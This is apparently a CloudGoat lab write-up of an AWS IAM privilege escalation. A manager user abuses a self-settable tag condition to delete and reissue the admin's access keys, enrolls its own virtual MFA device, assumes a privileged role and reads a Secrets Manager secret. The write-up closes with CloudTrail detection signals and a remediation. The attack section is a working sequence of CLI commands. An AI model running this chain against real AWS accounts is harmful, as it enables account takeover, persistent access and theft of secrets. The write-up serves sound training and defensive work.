# IAM Privilege Escalation via Tag-Gated Key Rotation

**Objective:** Starting as a low-privilege `manager` IAM user, escalate to a privileged role and read a protected Secrets Manager secret.
**AWS services:** IAM, Secrets Manager, STS.
**Source:** [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) scenario `iam_privesc_by_key_rotation`, run in `us-east-2`.

## Setup

The scenario deploys three IAM users (`manager`, `developer`, `admin`), a role
`cg_secretsmanager_<id>` that can read the target secret, and the secret itself.
All resources are IAM + Secrets Manager — no EC2, no hourly cost.

The `manager` user carries two inline policies:

- **`TagResources`** — may tag IAM users.
- **`SelfManageAccess`** — `iam:CreateAccessKey` / `DeleteAccessKey` / `EnableMFADevice`
  (and friends) on `user/*` and `mfa/*`, **conditioned only on
  `aws:ResourceTag/developer == "true"`**, plus unconditional `CreateVirtualMFADevice`.

```json
{
  "Sid": "SelfManageAccess",
  "Effect": "Allow",
  "Action": ["iam:CreateAccessKey","iam:DeleteAccessKey","iam:EnableMFADevice",
             "iam:DeactivateMFADevice","iam:ResyncMFADevice","iam:UpdateAccessKey","iam:GetMFADevice"],
  "Resource": ["arn:aws:iam::<ACCOUNT_ID>:user/*","arn:aws:iam::<ACCOUNT_ID>:mfa/*"],
  "Condition": {"StringEquals": {"aws:ResourceTag/developer": "true"}}
}
```

**The flaw:** the condition gates on a tag the *same principal* is allowed to set. A
condition you can satisfy yourself is not a control.

## Attack

All commands run under a `manager` profile configured from the scenario's starting key.

**1 — Tag the admin user so it matches the condition:**
```bash
aws iam tag-user --user-name admin_<id> --tags Key=developer,Value=true --profile manager
```

**2 — Rotate the admin's access key to take over the identity** (an IAM user allows two
keys; delete one, mint a new one you control):
```bash
OLD=$(aws iam list-access-keys --user-name admin_<id> --query 'AccessKeyMetadata[0].AccessKeyId' --output text --profile manager)
aws iam delete-access-key --user-name admin_<id> --access-key-id "$OLD" --profile manager
aws iam create-access-key --user-name admin_<id> --profile manager     # -> attacker-controlled admin creds
```

**3 — The secretsmanager role's trust policy requires MFA, so give admin a virtual MFA device.**
Bootstrap the device with a Base32 seed (scriptable), then enable it with two consecutive TOTP codes:
```bash
aws iam create-virtual-mfa-device --virtual-mfa-device-name cg_mfa_<id> \
  --bootstrap-method Base32StringSeed --outfile seed.txt --profile manager
# compute two consecutive 30s TOTP codes from the seed (oathtool, or a ~40-line python TOTP)
aws iam enable-mfa-device --user-name admin_<id> \
  --serial-number arn:aws:iam::<ACCOUNT_ID>:mfa/cg_mfa_<id> \
  --authentication-code1 <code_N> --authentication-code2 <code_N+1> --profile manager
```

**4 — Assume the privileged role with an MFA token, then read the secret:**
```bash
aws sts assume-role --profile admin \
  --role-arn arn:aws:iam::<ACCOUNT_ID>:role/cg_secretsmanager_<id> \
  --role-session-name loot --serial-number arn:aws:iam::<ACCOUNT_ID>:mfa/cg_mfa_<id> \
  --token-code <fresh_TOTP>
# export the returned temporary creds, then:
aws secretsmanager get-secret-value --secret-id cg_secret_<id> --query SecretString --output text
# -> flag{14m_PERM15510N5_4Re_5C4R_<redacted>}
```

## What the attacker gains

Full control of the `admin` identity (and any user in the account, via the same
tag-then-rotate move), plus the ability to satisfy an MFA-gated role trust policy by
enrolling their own virtual MFA device. Net result: read access to the protected secret,
and a durable foothold — the rotated key and enrolled MFA survive until an operator notices.

## Detection

_(added in Phase 3)_ — signal to hunt: `iam:TagUser` setting `developer=true` followed
closely by `iam:DeleteAccessKey` + `iam:CreateAccessKey` + `iam:CreateVirtualMFADevice` /
`iam:EnableMFADevice` on the same target user, by a non-admin principal, in CloudTrail.

## Remediation

_(added in Phase 4)_ — the core fix: never gate an IAM permission on a resource tag the
same principal can set. Enforce the `developer` tag via a permission boundary or an SCP
that denies `iam:TagUser`/`iam:UntagUser` on that key to the `manager` principal, so the
condition is controlled by a separate authority.
